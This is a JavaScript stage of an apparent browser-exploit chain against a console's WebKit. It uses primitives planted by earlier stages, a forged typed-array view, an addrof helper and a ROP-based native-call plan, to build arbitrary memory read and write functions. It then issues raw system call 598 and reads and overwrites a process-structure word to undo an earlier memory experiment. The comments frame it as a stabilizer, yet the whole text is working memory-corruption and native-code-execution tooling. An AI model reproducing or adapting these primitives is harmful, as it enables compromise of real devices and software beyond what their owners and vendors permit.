// ProcParam stabilizer: reads +0x14 (the live-consumed accounting word
// mutated to 0xFFFFFFFF by fmem_max_v1 and left in place). If it still
// holds the mutated value, restores the original 0x00000000 and
// verifies; if the process respawned with a fresh ProcParam, reports
// the fresh state. This stabilizes the console after the max-value
// experiment (both extremes — 0 and 0xFFFFFFFF — destabilize
// allocation). Read-only unless mutated. PID + restore verified.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(addressValue, bytes) {
    if (!Number.isSafeInteger(addressValue) ||
        addressValue % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("write_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function hex(bytes, cap) {
    var out = "";
    var lim = Math.min(bytes.length, cap || 8);
    for (var i = 0; i < lim; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("stb_preflight");
  phase = "call_598";
  var sizePtrOff = 0x1e00, bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  fv.setUint32(sizePtrOff, sizeOrig, true);
  if (call598.value !== 0)
    throw new Error("call598_failed");
  var rootBase = fv.getUint32(bufOff + 4, true) * 0x100000000 +
    fv.getUint32(bufOff, true);
  mark("stb_598ok");
  phase = "read14";
  var cur = readAt(rootBase + 0x10, 8);
  var curHex = hex(cur);
  var mutated = cur[4] === 0xff && cur[5] === 0xff &&
    cur[6] === 0xff && cur[7] === 0xff;
  mark("stb_read_" + (mutated ? "mutated" : "clean"));
  var restoreMsg = "not_needed";
  if (mutated) {
    phase = "restore";
    var orig = [cur[0], cur[1], cur[2], cur[3], 0, 0, 0, 0];
    writeAt(rootBase + 0x10, orig);
    var chk = readAt(rootBase + 0x10, 8);
    restoreMsg = same(chk, orig) ? "restored_ok" : "restore_mismatch";
    mark("stb_restored:" + restoreMsg);
  }
  var verify = readAt(rootBase + 0x10, 8);
  var after = native.call("getpid", []);
  mark("stb_done");
  result = { id: "procparam_stabilize_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { root_base: rootBase.toString(16),
      read14: curHex, was_mutated: mutated ? 1 : 0,
      action: restoreMsg,
      final: hex(verify),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "procparam_stabilize_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
